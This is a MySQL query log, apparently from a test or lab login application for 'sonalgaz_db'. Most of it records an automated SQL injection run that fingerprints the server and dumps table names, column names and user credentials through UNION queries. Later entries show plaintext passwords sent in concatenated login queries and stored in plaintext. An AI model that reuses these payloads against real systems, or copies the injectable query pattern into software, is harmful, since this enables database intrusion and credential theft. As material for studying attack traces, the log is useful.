+2025-04-11T02:03:42.710207Z	   85 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.710533Z	   85 Prepare	SELECT * FROM users WHERE username = 'test' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(1263=1263,1))),0x7176786271,0x78))s), 8446744073709551610, 8446744073709551610)))-- vxPu' AND password = 'test'
+2025-04-11T02:03:42.710570Z	   85 Execute	SELECT * FROM users WHERE username = 'test' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(1263=1263,1))),0x7176786271,0x78))s), 8446744073709551610, 8446744073709551610)))-- vxPu' AND password = 'test'
+2025-04-11T02:03:42.710834Z	   85 Close stmt	
+2025-04-11T02:03:42.710860Z	   85 Quit	
+2025-04-11T02:03:42.716688Z	   86 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.717023Z	   86 Prepare	SELECT * FROM users WHERE username = 'test' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(7472=7472,1))),0x7176786271,0x78))x))-- anny' AND password = 'test'
+2025-04-11T02:03:42.717060Z	   86 Execute	SELECT * FROM users WHERE username = 'test' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(7472=7472,1))),0x7176786271,0x78))x))-- anny' AND password = 'test'
+2025-04-11T02:03:42.718670Z	   86 Close stmt	
+2025-04-11T02:03:42.718703Z	   86 Quit	
+2025-04-11T02:03:42.723298Z	   87 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.723620Z	   87 Prepare	SELECT * FROM users WHERE username = 'test' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(1780=1780,1))),0x7176786271,0x78))x))-- xVid' AND password = 'test'
+2025-04-11T02:03:42.723660Z	   87 Execute	SELECT * FROM users WHERE username = 'test' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(1780=1780,1))),0x7176786271,0x78))x))-- xVid' AND password = 'test'
+2025-04-11T02:03:42.723943Z	   87 Close stmt	
+2025-04-11T02:03:42.723964Z	   87 Quit	
+2025-04-11T02:03:42.732657Z	   88 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.733078Z	   88 Quit	
+2025-04-11T02:03:42.739134Z	   89 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.739412Z	   89 Prepare	SELECT * FROM users WHERE username = '(SELECT CONCAT(0x716b6b6b71,(ELT(5419=5419,1)),0x7176786271))' AND password = 'test'
+2025-04-11T02:03:42.739456Z	   89 Execute	SELECT * FROM users WHERE username = '(SELECT CONCAT(0x716b6b6b71,(ELT(5419=5419,1)),0x7176786271))' AND password = 'test'
+2025-04-11T02:03:42.739759Z	   89 Close stmt	
+2025-04-11T02:03:42.739792Z	   89 Quit	
+2025-04-11T02:03:42.743451Z	   90 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.743911Z	   90 Quit	
+2025-04-11T02:03:42.749357Z	   91 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.749700Z	   91 Quit	
+2025-04-11T02:03:42.754752Z	   92 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.755220Z	   92 Quit	
+2025-04-11T02:03:42.760070Z	   93 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.760418Z	   93 Quit	
+2025-04-11T02:03:42.764924Z	   94 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.765222Z	   94 Quit	
+2025-04-11T02:03:42.769837Z	   95 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.770207Z	   95 Quit	
+2025-04-11T02:03:42.775365Z	   96 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.775656Z	   96 Prepare	SELECT * FROM users WHERE username = 'test' AND (SELECT 5638 FROM (SELECT(SLEEP(5)))owSD)-- AEhV' AND password = 'test'
+2025-04-11T02:03:42.775717Z	   96 Execute	SELECT * FROM users WHERE username = 'test' AND (SELECT 5638 FROM (SELECT(SLEEP(5)))owSD)-- AEhV' AND password = 'test'
+2025-04-11T02:03:47.776402Z	   96 Close stmt	
+2025-04-11T02:03:47.776462Z	   96 Quit	
+2025-04-11T02:03:47.780643Z	   97 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:47.781024Z	   97 Prepare	SELECT * FROM users WHERE username = 'test' AND (SELECT 5638 FROM (SELECT(SLEEP(0)))owSD)-- AEhV' AND password = 'test'
+2025-04-11T02:03:47.781124Z	   97 Execute	SELECT * FROM users WHERE username = 'test' AND (SELECT 5638 FROM (SELECT(SLEEP(0)))owSD)-- AEhV' AND password = 'test'
+2025-04-11T02:03:47.781495Z	   97 Close stmt	
+2025-04-11T02:03:47.781530Z	   97 Quit	
+2025-04-11T02:03:47.785360Z	   98 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:47.785761Z	   98 Prepare	SELECT * FROM users WHERE username = 'test' AND (SELECT 5638 FROM (SELECT(SLEEP(5)))owSD)-- AEhV' AND password = 'test'
+2025-04-11T02:03:47.785820Z	   98 Execute	SELECT * FROM users WHERE username = 'test' AND (SELECT 5638 FROM (SELECT(SLEEP(5)))owSD)-- AEhV' AND password = 'test'
+2025-04-11T02:03:52.787877Z	   98 Close stmt	
+2025-04-11T02:03:52.788051Z	   98 Quit	
+2025-04-11T02:03:52.840134Z	   99 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.841724Z	   99 Prepare	SELECT * FROM users WHERE username = 'test' ORDER BY 1#' AND password = 'test'
+2025-04-11T02:03:52.841961Z	   99 Execute	SELECT * FROM users WHERE username = 'test' ORDER BY 1#' AND password = 'test'
+2025-04-11T02:03:52.843340Z	   99 Close stmt	
+2025-04-11T02:03:52.843489Z	   99 Quit	
+2025-04-11T02:03:52.870309Z	  100 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.872831Z	  100 Quit	
+2025-04-11T02:03:52.892300Z	  101 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.893669Z	  101 Quit	
+2025-04-11T02:03:52.901144Z	  102 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.901847Z	  102 Quit	
+2025-04-11T02:03:52.912284Z	  103 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.912724Z	  103 Prepare	SELECT * FROM users WHERE username = 'test' ORDER BY 4#' AND password = 'test'
+2025-04-11T02:03:52.912778Z	  103 Execute	SELECT * FROM users WHERE username = 'test' ORDER BY 4#' AND password = 'test'
+2025-04-11T02:03:52.913137Z	  103 Close stmt	
+2025-04-11T02:03:52.913169Z	  103 Quit	
+2025-04-11T02:03:52.917957Z	  104 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.918577Z	  104 Quit	
+2025-04-11T02:03:52.929356Z	  105 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.929879Z	  105 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6b6b71,0x6e5356545747496470557a58486e4257594f58584454434d646b754f71476a655162546e66517147,0x7176786271),NULL#' AND password = 'test'
+2025-04-11T02:03:52.929939Z	  105 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6b6b71,0x6e5356545747496470557a58486e4257594f58584454434d646b754f71476a655162546e66517147,0x7176786271),NULL#' AND password = 'test'
+2025-04-11T02:03:52.938326Z	  105 Close stmt	
+2025-04-11T02:03:52.938362Z	  105 Quit	
+2025-04-11T02:03:52.954415Z	  106 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.954916Z	  106 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x6a58544a4c726574746f566a64766f49716a52757255544a5569576f5946516850514563626f4f67,0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:52.954994Z	  106 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x6a58544a4c726574746f566a64766f49716a52757255544a5569576f5946516850514563626f4f67,0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:52.955622Z	  106 Close stmt	
+2025-04-11T02:03:52.955656Z	  106 Quit	
+2025-04-11T02:03:52.969260Z	  107 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.969567Z	  107 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x6a58544a4c726574746f566a64766f49716a52757255544a5569576f5946516850514563626f4f67,0x7176786271),NULL,NULL UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x4d4e626f464e64714f7944744d4e5149576e746b62616d53666366786156494a477577464e567844,0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:52.969625Z	  107 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x6a58544a4c726574746f566a64766f49716a52757255544a5569576f5946516850514563626f4f67,0x7176786271),NULL,NULL UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,0x4d4e626f464e64714f7944744d4e5149576e746b62616d53666366786156494a477577464e567844,0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:52.969911Z	  107 Close stmt	
+2025-04-11T02:03:52.969934Z	  107 Quit	
+2025-04-11T02:03:52.992363Z	  108 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:52.992900Z	  108 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:52.993075Z	  108 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:52.993795Z	  108 Close stmt	
+2025-04-11T02:03:52.993828Z	  108 Quit	
+2025-04-11T02:03:53.010112Z	  109 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.010528Z	  109 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:53.010661Z	  109 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:53.011162Z	  109 Close stmt	
+2025-04-11T02:03:53.011187Z	  109 Quit	
+2025-04-11T02:03:53.024583Z	  110 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.025271Z	  110 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:53.025332Z	  110 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:53.025936Z	  110 Close stmt	
+2025-04-11T02:03:53.025970Z	  110 Quit	
+2025-04-11T02:03:53.038204Z	  111 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.039176Z	  111 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:53.039347Z	  111 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7176786271),NULL,NULL#' AND password = 'test'
+2025-04-11T02:03:53.040640Z	  111 Close stmt	
+2025-04-11T02:03:53.040758Z	  111 Quit	
+2025-04-11T02:03:53.051784Z	  112 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.060859Z	  112 Quit	
+2025-04-11T02:03:53.066299Z	  113 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.067049Z	  113 Quit	
+2025-04-11T02:03:53.072931Z	  114 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.073803Z	  114 Quit	
+2025-04-11T02:03:53.079402Z	  115 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.080414Z	  115 Quit	
+2025-04-11T02:03:53.086760Z	  116 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.087305Z	  116 Quit	
+2025-04-11T02:03:53.095391Z	  117 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.095803Z	  117 Quit	
+2025-04-11T02:03:53.103167Z	  118 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.109002Z	  118 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,JSON_ARRAYAGG(CONCAT_WS(0x616273757a62,IFNULL(CAST(table_name AS CHAR),0x20))),0x7176786271),NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x736f6e616c67617a5f6462)#' AND password = 'test'
+2025-04-11T02:03:53.109068Z	  118 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,JSON_ARRAYAGG(CONCAT_WS(0x616273757a62,IFNULL(CAST(table_name AS CHAR),0x20))),0x7176786271),NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x736f6e616c67617a5f6462)#' AND password = 'test'
+2025-04-11T02:03:53.110465Z	  118 Close stmt	
+2025-04-11T02:03:53.110491Z	  118 Quit	
+2025-04-11T02:03:53.123292Z	  119 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.126020Z	  119 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,JSON_ARRAYAGG(CONCAT_WS(0x616273757a62,IFNULL(CAST(column_name AS CHAR),0x20),IFNULL(CAST(column_type AS CHAR),0x20))),0x7176786271),NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x736f6e616c67617a5f6462#' AND password = 'test'
+2025-04-11T02:03:53.126093Z	  119 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,JSON_ARRAYAGG(CONCAT_WS(0x616273757a62,IFNULL(CAST(column_name AS CHAR),0x20),IFNULL(CAST(column_type AS CHAR),0x20))),0x7176786271),NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x736f6e616c67617a5f6462#' AND password = 'test'
+2025-04-11T02:03:53.126785Z	  119 Close stmt	
+2025-04-11T02:03:53.126816Z	  119 Quit	
+2025-04-11T02:03:53.141813Z	  120 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:53.142364Z	  120 Prepare	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,JSON_ARRAYAGG(CONCAT_WS(0x616273757a62,IFNULL(CAST(email AS CHAR),0x20),IFNULL(CAST(id AS CHAR),0x20),IFNULL(CAST(password AS CHAR),0x20),IFNULL(CAST(username AS CHAR),0x20))),0x7176786271),NULL,NULL FROM sonalgaz_db.users#' AND password = 'test'
+2025-04-11T02:03:53.142413Z	  120 Execute	SELECT * FROM users WHERE username = 'test' UNION ALL SELECT NULL,CONCAT(0x716b6b6b71,JSON_ARRAYAGG(CONCAT_WS(0x616273757a62,IFNULL(CAST(email AS CHAR),0x20),IFNULL(CAST(id AS CHAR),0x20),IFNULL(CAST(password AS CHAR),0x20),IFNULL(CAST(username AS CHAR),0x20))),0x7176786271),NULL,NULL FROM sonalgaz_db.users#' AND password = 'test'
+2025-04-11T02:03:53.142813Z	  120 Close stmt	
+2025-04-11T02:03:53.142843Z	  120 Quit	
+2025-04-11T02:17:03.871750Z	   13 Quit	
+/usr/sbin/mysqld, Version: 9.2.0 (MySQL Community Server - GPL). started with:
+Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
+Time                 Id Command    Argument
+2025-04-16T22:32:49.037785Z	   10 Query	SET GLOBAL slow_query_log = 'ON'
+2025-04-16T22:32:49.049003Z	   10 Query	SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log'
+2025-04-16T22:32:57.562594Z	   10 Query	SHOW VARIABLES LIKE 'general_log%'
+2025-04-16T22:32:57.584963Z	   10 Query	SHOW VARIABLES LIKE 'slow_query_log%'
+2025-04-16T22:33:00.336169Z	   10 Quit	
+2025-04-16T23:43:14.160677Z	   11 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-16T23:43:14.161908Z	   11 Prepare	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-16T23:43:14.162040Z	   11 Execute	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-16T23:43:14.163188Z	   11 Close stmt	
+2025-04-16T23:43:14.163803Z	   11 Quit	
+2025-04-16T23:47:47.192294Z	   12 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-16T23:47:47.193820Z	   12 Prepare	SELECT * FROM users WHERE username = ?
+2025-04-16T23:47:47.194369Z	   12 Execute	SELECT * FROM users WHERE username = 'admin'
+2025-04-16T23:47:47.195979Z	   12 Close stmt	
+2025-04-16T23:47:47.196129Z	   12 Quit	
+2025-04-16T23:47:49.229093Z	   13 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-16T23:47:49.230746Z	   13 Prepare	SELECT * FROM users WHERE username = ?
+2025-04-16T23:47:49.231216Z	   13 Execute	SELECT * FROM users WHERE username = 'admin'
+2025-04-16T23:47:49.240461Z	   13 Prepare	UPDATE users SET username = ?, email = ?, password = ? WHERE username = ?
+2025-04-16T23:47:49.240957Z	   13 Execute	UPDATE users SET username = 'admin', email = 'admin@sonalgaz.com', password = 'admin123' WHERE username = 'admin'
+2025-04-16T23:47:49.243484Z	   13 Close stmt	
+2025-04-16T23:47:49.243657Z	   13 Close stmt	
+2025-04-16T23:47:49.243753Z	   13 Quit	
+2025-04-16T23:47:58.387375Z	   14 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-16T23:47:58.388191Z	   14 Prepare	SELECT * FROM users WHERE username = 'ikramsbn' AND password = 'IKram123'
+2025-04-16T23:47:58.388307Z	   14 Execute	SELECT * FROM users WHERE username = 'ikramsbn' AND password = 'IKram123'
+2025-04-16T23:47:58.389103Z	   14 Close stmt	
+2025-04-16T23:47:58.389185Z	   14 Quit	
+2025-04-16T23:56:34.655616Z	   15 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-16T23:56:34.655997Z	   15 Prepare	SELECT * FROM users WHERE username = 'ikramsbn' AND password = 'IKram123'
+2025-04-16T23:56:34.656049Z	   15 Execute	SELECT * FROM users WHERE username = 'ikramsbn' AND password = 'IKram123'
+2025-04-16T23:56:34.656356Z	   15 Close stmt	
+2025-04-16T23:56:34.656392Z	   15 Quit	
+2025-04-17T00:45:41.632632Z	   16 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-17T00:45:41.633254Z	   16 Prepare	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-17T00:45:41.633397Z	   16 Execute	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-17T00:45:41.633993Z	   16 Close stmt	
+2025-04-17T00:45:41.634022Z	   16 Quit	
+2025-04-17T02:07:57.985403Z	   17 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-17T02:07:57.987785Z	   17 Prepare	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-17T02:07:57.987984Z	   17 Execute	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-17T02:07:57.989980Z	   17 Close stmt	
+2025-04-17T02:07:57.990052Z	   17 Quit	
+2025-04-17T02:36:16.587254Z	   18 Connect	root@172.21.0.8 on sonalgaz_db using TCP/IP
+2025-04-17T02:36:16.588659Z	   18 Prepare	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-17T02:36:16.589404Z	   18 Execute	SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
+2025-04-17T02:36:16.589985Z	   18 Close stmt	
+2025-04-17T02:36:16.590036Z	   18 Quit	
